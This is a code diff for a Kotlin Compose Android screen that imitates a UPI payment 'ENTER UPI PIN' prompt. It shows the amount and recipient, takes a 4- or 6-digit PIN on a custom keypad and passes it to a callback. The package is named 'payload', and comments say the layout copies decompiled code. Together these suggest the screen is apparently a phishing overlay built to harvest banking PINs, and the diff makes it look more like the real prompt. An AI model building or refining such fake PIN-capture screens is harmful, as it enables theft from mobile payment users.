@@ -1,6 +1,5 @@
 package com.payload.jansiix0ne.ui.screens
 
-import androidx.compose.foundation.Image
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.shape.CircleShape
@@ -8,6 +7,7 @@ import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material3.Button
 import androidx.compose.material3.ButtonDefaults
 import androidx.compose.material3.CircularProgressIndicator
+import androidx.compose.material3.Icon
 import androidx.compose.material3.Text
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
@@ -16,6 +16,7 @@ import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.res.painterResource
 import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.compose.ui.window.Dialog
@@ -35,100 +36,86 @@ fun UPIPinScreen(
         modifier = Modifier
             .fillMaxSize()
             .background(Color.White)
-            .padding(24.dp),
-        horizontalAlignment = Alignment.CenterHorizontally
     ) {
-        Spacer(modifier = Modifier.height(40.dp))
-        
-        // UPI Logo - استفاده از تصویر واقعی
-        Image(
-            painter = painterResource(id = R.drawable.upi_pin_img),
-            contentDescription = "UPI Logo",
-            modifier = Modifier
-                .size(68.dp)
-                .padding(bottom = 16.dp)
-        )
-        
-        // Transaction Details
-        Row(
+        // Top section with transaction details
+        Column(
             modifier = Modifier
                 .fillMaxWidth()
-                .padding(vertical = 16.dp),
-            horizontalArrangement = Arrangement.SpaceBetween
+                .background(Color(0xFFF5F5F5))
+                .padding(horizontal = 24.dp, vertical = 20.dp)
         ) {
-            Text(
-                text = "Sending:",
-                fontSize = 16.sp,
-                color = Color.Gray
-            )
-            Text(
-                text = amount,
-                fontSize = 18.sp,
-                fontWeight = FontWeight.Bold,
-                color = Color.Black
-            )
+            // Sending amount
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceBetween,
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Text(
+                    text = "Sending:",
+                    fontSize = 16.sp,
+                    color = Color.Black
+                )
+                Text(
+                    text = amount,
+                    fontSize = 16.sp,
+                    fontWeight = FontWeight.Bold,
+                    color = Color.Black
+                )
+            }
+            
+            Spacer(modifier = Modifier.height(12.dp))
+            
+            // Recipient
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceBetween,
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Text(
+                    text = "To:",
+                    fontSize = 16.sp,
+                    color = Color.Black
+                )
+                Text(
+                    text = recipient,
+                    fontSize = 16.sp,
+                    fontWeight = FontWeight.Bold,
+                    color = Color.Black
+                )
+            }
         }
         
-        Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(bottom = 32.dp),
-            horizontalArrangement = Arrangement.SpaceBetween
-        ) {
-            Text(
-                text = "To:",
-                fontSize = 16.sp,
-                color = Color.Gray
-            )
-            Text(
-                text = recipient,
-                fontSize = 18.sp,
-                fontWeight = FontWeight.Bold,
-                color = Color.Black
-            )
-        }
+        Spacer(modifier = Modifier.height(32.dp))
         
         // Enter PIN Text
         Text(
             text = "ENTER UPI PIN",
-            fontSize = 20.sp,
+            fontSize = 18.sp,
             fontWeight = FontWeight.Bold,
             color = Color.Black,
-            modifier = Modifier.padding(bottom = 24.dp)
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(horizontal = 24.dp),
+            textAlign = TextAlign.Center
         )
         
-        // PIN Dots - پشتیبانی از 4 یا 6 رقم (مطابق کد decompiled)
-        Row(
-            modifier = Modifier.padding(bottom = 24.dp),
-            horizontalArrangement = Arrangement.spacedBy(16.dp)
-        ) {
-            repeat(6) { index ->
-                Box(
-                    modifier = Modifier
-                        .size(16.dp)
-                        .clip(CircleShape)
-                        .background(
-                            if (index < pin.length) Color.Black else Color.Gray.copy(alpha = 0.3f)
-                        )
-                )
-            }
-        }
+        Spacer(modifier = Modifier.height(32.dp))
         
         // Info Banner
         Box(
             modifier = Modifier
                 .fillMaxWidth()
-                .clip(RoundedCornerShape(12.dp))
+                .padding(horizontal = 24.dp)
+                .clip(RoundedCornerShape(24.dp))
                 .background(Color(0xFFFFF3CD))
-                .padding(16.dp),
-            contentAlignment = Alignment.CenterStart
+                .padding(16.dp)
         ) {
             Row(
                 verticalAlignment = Alignment.CenterVertically
             ) {
                 Box(
                     modifier = Modifier
-                        .size(24.dp)
+                        .size(32.dp)
                         .clip(CircleShape)
                         .background(Color(0xFFFF9800)),
                     contentAlignment = Alignment.Center
@@ -136,16 +123,16 @@ fun UPIPinScreen(
                     Text(
                         text = "i",
                         color = Color.White,
-                        fontSize = 16.sp,
+                        fontSize = 18.sp,
                         fontWeight = FontWeight.Bold
                     )
                 }
                 Spacer(modifier = Modifier.width(12.dp))
                 Text(
                     text = "You are sending $amount from your account to $recipient",
-                    fontSize = 12.sp,
+                    fontSize = 14.sp,
                     color = Color.Black,
-                    modifier = Modifier.weight(1f)
+                    lineHeight = 20.sp
                 )
             }
         }
@@ -153,29 +140,64 @@ fun UPIPinScreen(
         Spacer(modifier = Modifier.weight(1f))
         
         // Number Pad
-        NumberPad(
-            onNumberClick = { number ->
-                // مطابق کد decompiled: حداکثر 6 رقم
-                if (pin.length < 6) {
-                    pin += number
-                }
-            },
-            onDeleteClick = {
-                if (pin.isNotEmpty()) {
-                    pin = pin.dropLast(1)
-                }
-            },
-            onConfirmClick = {
-                // مطابق کد decompiled: PIN باید 4 یا 6 رقم باشد
-                if (pin.length == 4 || pin.length == 6) {
-                    android.util.Log.d("UPIPinScreen", "✅ PIN entered: ${pin.length} digits")
-                    isVerifying = true
-                    onPinEntered(pin)
-                } else {
-                    android.util.Log.w("UPIPinScreen", "⚠️ Invalid PIN length: ${pin.length} (must be 4 or 6)")
-                }
+        Column(
+            modifier = Modifier
+                .fillMaxWidth()
+                .background(Color(0xFFF5F5F5))
+                .padding(horizontal = 24.dp, vertical = 20.dp),
+            horizontalAlignment = Alignment.CenterHorizontally,
+            verticalArrangement = Arrangement.spacedBy(16.dp)
+        ) {
+            // Row 1: 1, 2, 3
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceEvenly
+            ) {
+                NumberButton("1", onClick = { if (pin.length < 6) pin += "1" })
+                NumberButton("2", onClick = { if (pin.length < 6) pin += "2" })
+                NumberButton("3", onClick = { if (pin.length < 6) pin += "3" })
             }
-        )
+            
+            // Row 2: 4, 5, 6
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceEvenly
+            ) {
+                NumberButton("4", onClick = { if (pin.length < 6) pin += "4" })
+                NumberButton("5", onClick = { if (pin.length < 6) pin += "5" })
+                NumberButton("6", onClick = { if (pin.length < 6) pin += "6" })
+            }
+            
+            // Row 3: 7, 8, 9
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceEvenly
+            ) {
+                NumberButton("7", onClick = { if (pin.length < 6) pin += "7" })
+                NumberButton("8", onClick = { if (pin.length < 6) pin += "8" })
+                NumberButton("9", onClick = { if (pin.length < 6) pin += "9" })
+            }
+            
+            // Row 4: Delete, 0, Confirm
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceEvenly
+            ) {
+                DeleteButton(onClick = { if (pin.isNotEmpty()) pin = pin.dropLast(1) })
+                NumberButton("0", onClick = { if (pin.length < 6) pin += "0" })
+                ConfirmButton(
+                    onClick = {
+                        if (pin.length == 4 || pin.length == 6) {
+                            android.util.Log.d("UPIPinScreen", "✅ PIN entered: ${pin.length} digits")
+                            isVerifying = true
+                            onPinEntered(pin)
+                        } else {
+                            android.util.Log.w("UPIPinScreen", "⚠️ Invalid PIN length: ${pin.length} (must be 4 or 6)")
+                        }
+                    }
+                )
+            }
+        }
     }
     
     // Verifying Dialog
@@ -192,8 +214,6 @@ fun UPIPinScreen(
                 Column(
                     horizontalAlignment = Alignment.CenterHorizontally
                 ) {
-                    // Verification Icon (placeholder - you can add an actual icon)
-                    Spacer(modifier = Modifier.height(20.dp))
                     CircularProgressIndicator(
                         modifier = Modifier.size(48.dp),
                         color = Color(0xFF4CAF50)
@@ -212,126 +232,65 @@ fun UPIPinScreen(
 }
 
 @Composable
-fun NumberPad(
-    onNumberClick: (String) -> Unit,
-    onDeleteClick: () -> Unit,
-    onConfirmClick: () -> Unit
-) {
-    Column(
-        modifier = Modifier.fillMaxWidth(),
-        horizontalAlignment = Alignment.CenterHorizontally,
-        verticalArrangement = Arrangement.spacedBy(12.dp)
-    ) {
-        // Row 1: 1, 2, 3
-        Row(
-            modifier = Modifier.fillMaxWidth(),
-            horizontalArrangement = Arrangement.spacedBy(12.dp)
-        ) {
-            NumberButton("1", onClick = { onNumberClick("1") }, modifier = Modifier.weight(1f))
-            NumberButton("2", onClick = { onNumberClick("2") }, modifier = Modifier.weight(1f))
-            NumberButton("3", onClick = { onNumberClick("3") }, modifier = Modifier.weight(1f))
-        }
-        
-        // Row 2: 4, 5, 6
-        Row(
-            modifier = Modifier.fillMaxWidth(),
-            horizontalArrangement = Arrangement.spacedBy(12.dp)
-        ) {
-            NumberButton("4", onClick = { onNumberClick("4") }, modifier = Modifier.weight(1f))
-            NumberButton("5", onClick = { onNumberClick("5") }, modifier = Modifier.weight(1f))
-            NumberButton("6", onClick = { onNumberClick("6") }, modifier = Modifier.weight(1f))
-        }
-        
-        // Row 3: 7, 8, 9
-        Row(
-            modifier = Modifier.fillMaxWidth(),
-            horizontalArrangement = Arrangement.spacedBy(12.dp)
-        ) {
-            NumberButton("7", onClick = { onNumberClick("7") }, modifier = Modifier.weight(1f))
-            NumberButton("8", onClick = { onNumberClick("8") }, modifier = Modifier.weight(1f))
-            NumberButton("9", onClick = { onNumberClick("9") }, modifier = Modifier.weight(1f))
-        }
-        
-        // Row 4: Delete, 0, Confirm
-        Row(
-            modifier = Modifier.fillMaxWidth(),
-            horizontalArrangement = Arrangement.spacedBy(12.dp)
-        ) {
-            DeleteButton(onClick = onDeleteClick, modifier = Modifier.weight(1f))
-            NumberButton("0", onClick = { onNumberClick("0") }, modifier = Modifier.weight(1f))
-            ConfirmButton(onClick = onConfirmClick, modifier = Modifier.weight(1f))
-        }
-    }
-}
-
-@Composable
 fun NumberButton(
     number: String,
-    onClick: () -> Unit,
-    modifier: Modifier = Modifier
+    onClick: () -> Unit
 ) {
     Button(
         onClick = onClick,
-        modifier = modifier
-            .aspectRatio(1f)
-            .height(64.dp),
-        shape = RoundedCornerShape(12.dp),
+        modifier = Modifier.size(80.dp),
+        shape = CircleShape,
         colors = ButtonDefaults.buttonColors(
-            containerColor = Color(0xFF2196F3)
-        )
+            containerColor = Color.Transparent,
+            contentColor = Color(0xFF1A237E)
+        ),
+        elevation = ButtonDefaults.buttonElevation(0.dp)
     ) {
         Text(
             text = number,
-            fontSize = 24.sp,
-            fontWeight = FontWeight.Bold,
-            color = Color.White
+            fontSize = 28.sp,
+            fontWeight = FontWeight.Normal,
+            color = Color(0xFF1A237E)
         )
     }
 }
 
 @Composable
-fun DeleteButton(
-    onClick: () -> Unit,
-    modifier: Modifier = Modifier
-) {
+fun DeleteButton(onClick: () -> Unit) {
     Button(
         onClick = onClick,
-        modifier = modifier
-            .aspectRatio(1f)
-            .height(64.dp),
-        shape = RoundedCornerShape(12.dp),
+        modifier = Modifier.size(80.dp),
+        shape = CircleShape,
         colors = ButtonDefaults.buttonColors(
-            containerColor = Color(0xFF2196F3)
+            containerColor = Color(0xFF1A237E),
+            contentColor = Color.White
         )
     ) {
         Text(
-            text = "⌫",
-            fontSize = 24.sp,
+            text = "×",
+            fontSize = 32.sp,
+            fontWeight = FontWeight.Normal,
             color = Color.White
         )
     }
 }
 
 @Composable
-fun ConfirmButton(
-    onClick: () -> Unit,
-    modifier: Modifier = Modifier
-) {
+fun ConfirmButton(onClick: () -> Unit) {
     Button(
         onClick = onClick,
-        modifier = modifier
-            .aspectRatio(1f)
-            .height(64.dp),
+        modifier = Modifier.size(80.dp),
         shape = CircleShape,
         colors = ButtonDefaults.buttonColors(
-            containerColor = Color(0xFF2196F3)
+            containerColor = Color(0xFF1A237E),
+            contentColor = Color.White
         )
     ) {
         Text(
             text = "✓",
-            fontSize = 24.sp,
-            color = Color.White,
-            fontWeight = FontWeight.Bold
+            fontSize = 32.sp,
+            fontWeight = FontWeight.Bold,
+            color = Color.White
         )
     }
 }
